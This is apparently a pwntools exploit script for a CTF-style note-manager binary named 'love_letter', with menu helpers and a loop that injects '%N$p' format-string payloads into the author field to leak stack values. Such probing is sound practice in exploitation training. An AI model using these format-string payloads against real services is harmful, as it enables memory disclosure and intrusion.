#!/usr/bin/env python3
from pwn import *
from subprocess import Popen

# =========================================================
#                          SETUP                         
# =========================================================
exe = './love_letter'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "127.0.0.1", 5000


gdbscript = '''
init-pwndbg
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/love_letter"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if args.QEMU:
        gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
        for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
            gdb_args.extend(["-ex", cmd])
        Popen(gdb_args)
    elif args.DOCKER:
        gdbscript = f'''
        init-pwndbg
        set sysroot /proc/{pid}/root
        c
        '''.format(**locals())        
        attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='love_letter')
    else:
        attach(io, gdbscript=gdbscript)


# =========================================================
#                         EXPLOITS
# =========================================================

def create_note(name, note, protect=False, password=b"anythin"):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b'> ', name)
    io.sendlineafter(b'> ', note)
    if protect:
        io.sendlineafter(b'> ', b'y')
        io.sendlineafter(b'> ', password)
    else:
        io.sendlineafter(b'> ', b"n")

def change_note(idx, author, note):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b'> ', str(idx).encode())
    io.sendlineafter(b': ', author)
    io.sendlineafter(b': ', note)

def view_note(idx):
    io.sendlineafter(b': ', b'3')
    io.sendlineafter(b'> ', str(idx).encode())

def delete_note(idx):
    io.sendlineafter(b': ', b'4')
    io.sendlineafter(b'> ', str(idx).encode())

def save_note(content):
    io.sendlineafter(b': ', b'5')
    io.sendlineafter(b'> ', content)

def exploit():
    global io
    io = initialize()
    create_note(b"", b"")
    for i in range(100):
        change_note(1, b"%%%d$p" % i, b"note")
        view_note(1)
        io.recvuntil(b"Author: ")
        leak = io.recvline().strip()
        print(f"Leak {i}: {leak}")
    debug()
    io.interactive()

if __name__ == '__main__':
    exploit()
